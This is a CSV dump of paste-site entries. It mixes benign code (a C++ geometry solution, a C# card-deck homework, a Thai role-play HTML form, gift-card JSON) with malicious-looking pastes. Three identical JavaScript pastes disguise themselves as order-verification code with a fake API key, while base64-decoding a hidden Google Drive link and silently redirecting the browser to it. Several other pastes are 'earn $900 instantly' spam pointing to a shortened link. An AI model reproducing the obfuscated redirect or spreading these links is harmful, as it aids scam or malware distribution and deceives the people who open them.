id,title,username,language,date,content
YtX3yrWS,地雷阵 参考代码,Dmaxiya,C++,Saturday 12th of April 2025 07:04:24 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const double PI = acos(-1.0);
const int maxn = 100000 + 100;
struct Node {
    double l, r;
    Node() {}
    Node(double l, double r): l(l), r(r) {}
};

bool operator<(const Node &a, const Node &b) {
    return a.l < b.l;
}

int n;
LL x, y, r;
double k, sum, ll, rr, theta1, theta2;
Node node[maxn];

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    cin >> n;
    for (int i = 0; i < n; ++i) {
        cin >> x >> y >> r;
        double theta = asin(r / sqrt(x * x + y * y));
        double beta = atan(y * 1.0 / x);
        node[i] = Node(beta - theta, beta + theta);
    }
    sort(node, node + n);
    for (int i = 0; i < n; ++i) {
        if (rr < node[i].l) {
            sum += rr - ll;
            rr = node[i].r;
            ll = node[i].l;
        } else {
            rr = max(node[i].r, rr);
        }
    }
    sum += rr - ll;
    printf(""%.3lf\n"", 1 - sum / (PI / 2));

    return 0;
}
"
s5H76tCy,EARN $900 INSTANTLY 2025⭐ G8,Minek10,JavaScript,Saturday 12th of April 2025 07:03:28 AM CDT," 
Pdf https://tinyurl.com/privguidee


dvZqLZxCWS
"
xhFKPDPH,Market.js,WantingTrae,JavaScript,Saturday 12th of April 2025 07:03:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76335/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WD09Tqf0,Make $1000 15-MINUTES  (BEGINNER) HV,Minek10,JavaScript,Saturday 12th of April 2025 06:50:04 AM CDT," 
Pdf https://tinyurl.com/privguidee


piMy0UViay
"
9tad7D34,Untitled,WantingTrae,JavaScript,Saturday 12th of April 2025 06:47:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56534/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MQkfKQu0,Promocao site,do1v2,JSON,Saturday 12th of April 2025 06:43:03 AM CDT,"[
  {
    ""loja"": ""Nintendo"",
    ""cor_fundo"": ""#ff6f61"",
    ""imagem"": ""https://via.placeholder.com/200x200?text=Donkey+Kong"",
    ""titulo"": ""Nintendo - Gift Card Digital 500 Reais"",
    ""categoria"": ""Nintendo Switch"",
    ""preco"": ""R$ 500,00""
  },
  {
    ""loja"": ""Nintendo"",
    ""cor_fundo"": ""#ff6f61"",
    ""imagem"": ""https://via.placeholder.com/200x200?text=Donkey+Kong"",
    ""titulo"": ""Nintendo - Gift Card Digital 500 Reais"",
    ""categoria"": ""Nintendo Switch"",
    ""preco"": ""R$ 500,00""
  },
  {
    ""loja"": ""Nintendo"",
    ""cor_fundo"": ""#ff6f61"",
    ""imagem"": ""https://via.placeholder.com/200x200?text=Donkey+Kong"",
    ""titulo"": ""Nintendo - Gift Card Digital 500 Reais"",
    ""categoria"": ""Nintendo Switch"",
    ""preco"": ""R$ 500,00""
  },
  {
    ""loja"": ""Nintendo"",
    ""cor_fundo"": ""#ff6f61"",
    ""imagem"": ""https://via.placeholder.com/200x200?text=Donkey+Kong"",
    ""titulo"": ""Nintendo - Gift Card Digital 500 Reais"",
    ""categoria"": ""Nintendo Switch"",
    ""preco"": ""R$ 500,00""
  },
  {
    ""loja"": ""Nintendo"",
    ""cor_fundo"": ""#ff6f61"",
    ""imagem"": ""https://via.placeholder.com/200x200?text=Donkey+Kong"",
    ""titulo"": ""Nintendo - Gift Card Digital 500 Reais"",
    ""categoria"": ""Nintendo Switch"",
    ""preco"": ""R$ 500,00""
  },
  {
    ""loja"": ""Nintendo"",
    ""cor_fundo"": ""#ff6f61"",
    ""imagem"": ""https://via.placeholder.com/200x200?text=Donkey+Kong"",
    ""titulo"": ""Nintendo - Gift Card Digital 500 Reais"",
    ""categoria"": ""Nintendo Switch"",
    ""preco"": ""R$ 500,00""
  },
  {
    ""loja"": ""Nintendo"",
    ""cor_fundo"": ""#ff6f61"",
    ""imagem"": ""https://via.placeholder.com/200x200?text=Donkey+Kong"",
    ""titulo"": ""Nintendo - Gift Card Digital 500 Reais"",
    ""categoria"": ""Nintendo Switch"",
    ""preco"": ""R$ 500,00""
  },
  {
    ""loja"": ""Nintendo"",
    ""cor_fundo"": ""#ff6f61"",
    ""imagem"": ""https://via.placeholder.com/200x200?text=Donkey+Kong"",
    ""titulo"": ""Nintendo - Gift Card Digital 500 Reais"",
    ""categoria"": ""Nintendo Switch"",
    ""preco"": ""R$ 500,00""
  },
  {
    ""loja"": ""Nintendo"",
    ""cor_fundo"": ""#ff6f61"",
    ""imagem"": ""https://via.placeholder.com/200x200?text=Donkey+Kong"",
    ""titulo"": ""Nintendo - Gift Card Digital 500 Reais"",
    ""categoria"": ""Nintendo Switch"",
    ""preco"": ""R$ 500,00""
  },
  {
    ""loja"": ""Nintendo"",
    ""cor_fundo"": ""#61bfff"",
    ""imagem"": ""https://via.placeholder.com/200x200?text=Wario"",
    ""titulo"": ""Nintendo - Gift Card Digital 400 Reais"",
    ""categoria"": ""Nintendo Switch"",
    ""preco"": ""R$ 400,00""
  }
]"
3j9KXFqM,EARN $900 INSTANTLY 2025 2U,Minek10,JavaScript,Saturday 12th of April 2025 06:36:39 AM CDT," 
Pdf https://tinyurl.com/privguidee


g4RtFVmnmc
"
HR9UzqjJ,Products.js,WantingTrae,JavaScript,Saturday 12th of April 2025 06:32:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79398/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
03Uf8cQf,West World : Register,Kelly-B9978,HTML,Saturday 12th of April 2025 06:31:59 AM CDT,"<!--
[คู่มือการแก้ไขโคด]
สีชื่อ ดาว ลายเซ็น : --west-primary: #9E5F24;

พื้นที่ลายเซ็นมีอัตราส่วน 4:1

ตำแหน่งภาพ : เพิ่ม --west-pos: 50% 50%; ต่อท้ายลิงก์รูปที่ต้องการปรับ
 - เลขตัวแรกคือการขยับซ้าย - ขวา โดย 0% = ชิดซ้าย 100% = ชิดขวา
 - เลขตัวแรกคือการขยับขึ้น - ลง โดย 0% = ชิดบน 100% = ชิดล่าง
 
ขนาดภาพ : เพิ่ม --west-size: cover; ต่อท้ายลิงก์รูปที่ต้องการปรับ
 - cover คือ ขยายเต็มพื้นที่
 - 100% คือ ขนาดเดิมของรูป
 - มากกว่า 100% คือ ขนาดใหญ่ขึ้น
 - น้อยกว่า 100% คือ ขนาดเล็กลง
-->

<link href=""https://dl.dropbox.com/scl/fi/ubghi6edr8wu7rh93inuu/west-world.css?rlkey=2zbqf4yxybassc685mj08ugtq&st=f9qgdzp5"" rel=""stylesheet"">
<div id=""WestWorld""><a href=""https://discord.com/users/625292873914515456/"" target=""_blank""></a><div class=""west-box"" id=""west-reg"">
<div class=""west-bg"" style=""--west-primary: #9E5F24;"">
<div class=""west-bd""><tpl></tpl><tpr></tpr><btl></btl><btr></btr>
<div class=""west-flex""><div class=""west-pic"" style=""--west-pic: url(--ลิงก์รูปภาพ--);""></div>
<div class=""west-info"">
<div class=""west-display-name"">(--Display Name--)</div>
<div class=""west-char-name"">--ชื่อตัวละคร--</div>
<div class=""west-gender-age""><div>[b]Gender:[/b] --เพศ--</div><div>[b]Age:[/b] --อายุ--</div></div>
<hr class=""west-star""></div></div>
<div class=""west-content"">
[b]เชื้อชาติ สัญชาติ:[/b] xxx
<hr>
[b]เมืองที่อาศัย:[/b] เมืองวาเลนไทน์ / เซนต์เดนีส / สตรอว์เบอร์รี / โรดส์ / แบล็ก วอเทอร์ (ระบุ 1 เมือง)
<hr>
[b]อาชีพ:[/b] xxx
<hr>
[b]ประวัติตัวละคร:[/b] xxx
<hr>
[b]ลักษณะทางกายภาพ:[/b] xxx
<hr>
[b]ลักษณะทางนิสัย:[/b] xxx
<hr>
[b]ข้อมูลเพิ่มเติม:[/b]
[list]
[*]ข้อมูล 1
[*]ข้อมูล 2
[*]ข้อมูล 3
[/list]
<hr>
<div class=""west-foot"">
<div class=""west-char-info"">
<div>No. 01 (หมายเลขตัวละคร 1 - 3)</div>
<div>Date: dd/MM/yyyy (วันที่ลงสมัคร)</div></div>
<div class=""west-sign-info"">
<div class=""west-sign"" style=""--west-sign: url(--ลิงก์รูปลายเซ็น--);""></div>
(--ชื่อตัวละคร--)</div>
</div></div>
</div></div></div></div>"
9qNWuqtJ,Homework41,JohnJuly,C#,Saturday 12th of April 2025 06:26:12 AM CDT,"using System;
using System.Collections.Generic;

namespace Homework41
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Croupier croupier = new Croupier();

            croupier.IsPlayed();
        }
    }

    class Croupier
    {
        private Deck _deck;

        public Croupier()
        {
            _deck = new Deck();
        }

        public void IsPlayed()
        {
            Player player = new Player();

            const string CommandDealCards = ""deal"";
            const string CommandShowCards = ""show"";
            const string CommandExitProgram = ""exit"";

            bool isWork = true;

            while (isWork)
            {
                Console.WriteLine(""Вы за игральным столом!!!"");
                Console.WriteLine($""Если хотите сыграть, введите {CommandDealCards} !"");
                Console.WriteLine($""Чтобы показать карты на руке, введите {CommandShowCards} !"");
                Console.WriteLine($""Если хотите выйти из-за стола, введите {CommandExitProgram}"");

                string userInput = Console.ReadLine()?.Trim().ToLower();

                switch (userInput)
                {
                    case CommandDealCards:
                        DealCards(player);
                        break;
                    case CommandShowCards:
                        player.ShowCards();
                        break;
                    case CommandExitProgram:
                        isWork = ExitProgram();
                        break;
                    default:
                        Console.WriteLine(""Неверная команда, попробуйте снова."");
                        break;
                }

                Console.ReadKey();
                Console.Clear();
            }
        }

        private void DealCards(Player player)
        {
            Console.Write(""Введите количество карт для игрока: "");

            string userInput = Console.ReadLine();
            int numberOfCards;

            if (int.TryParse(userInput, out numberOfCards) && numberOfCards > 0)
            {
                if (numberOfCards <= _deck.CardsRemaining)
                {
                    for (int i = 0; i < numberOfCards; i++)
                    {
                        Card card = _deck.DrawCard();
                        if (card != null)
                        {
                            player.TakeCard(card);
                        }
                    }
                    Console.WriteLine($""{numberOfCards} карт(ы) выданы игроку."");
                }
                else
                {
                    Console.WriteLine(""Недостаточно карт в колоде."");
                }
            }
            else
            {
                Console.WriteLine(""Введено некорректное количество."");
            }
        }

        private bool ExitProgram()
        {
            Console.WriteLine(""Вы вышли из-за стола"");
            return false;
        }
    }

    class Player
    {
        private List<Card> _cardsOnHand;

        public Player()
        {
            _cardsOnHand = new List<Card>();
        }

        public void TakeCard(Card card)
        {
            _cardsOnHand.Add(card);
        }

        public void ShowCards()
        {
            if (_cardsOnHand.Count == 0)
            {
                Console.WriteLine(""У вас нет карт на руке."");
            }
            else
            {
                Console.WriteLine(""Карты на руке:"");
                foreach (var card in _cardsOnHand)
                {
                    card.ShowCard();
                }
            }
        }
    }

    class Deck
    {
        private List<Card> _cards = new List<Card>();
        private Random _random = new Random();

        public Deck()
        {
            FillCards();
            ShuffleCards();
            CardsRemaining = _cards.Count;
        }

        public int CardsRemaining { get; private set; }

        public void FillCards()
        {
            List<string> names = new List<string>
            {
                ""2"", ""3"", ""4"", ""5"", ""6"", ""7"", ""8"", ""9"", ""10"", ""Валет"", ""Дама"", ""Король"", ""Туз""
            };

            List<string> suits = new List<string>
            {
                ""Пики"", ""Черви"", ""Трефы"", ""Бубны""
            };

            foreach (var suit in suits)
            {
                foreach (var name in names)
                {
                    _cards.Add(new Card(name, suit));
                }
            }
        }

        public void ShuffleCards()
        {
            for (int i = 0; i < _cards.Count; i++)
            {
                int j = _random.Next(i, _cards.Count);
                var temp = _cards[i];
                _cards[i] = _cards[j];
                _cards[j] = temp;
            }
        }

        public Card DrawCard()
        {
            if (_cards.Count == 0)
                return null;

            Card card = _cards[0];
            _cards.RemoveAt(0);
            return card;
        }
    }

    class Card
    {
        private string _name;
        private string _suit;

        public Card(string name, string suit)
        {
            _name = name;
            _suit = suit;
        }

        public void ShowCard()
        {
            Console.WriteLine($""Название карты: {_name} | Масть: {_suit}"");
        }
    }
}"
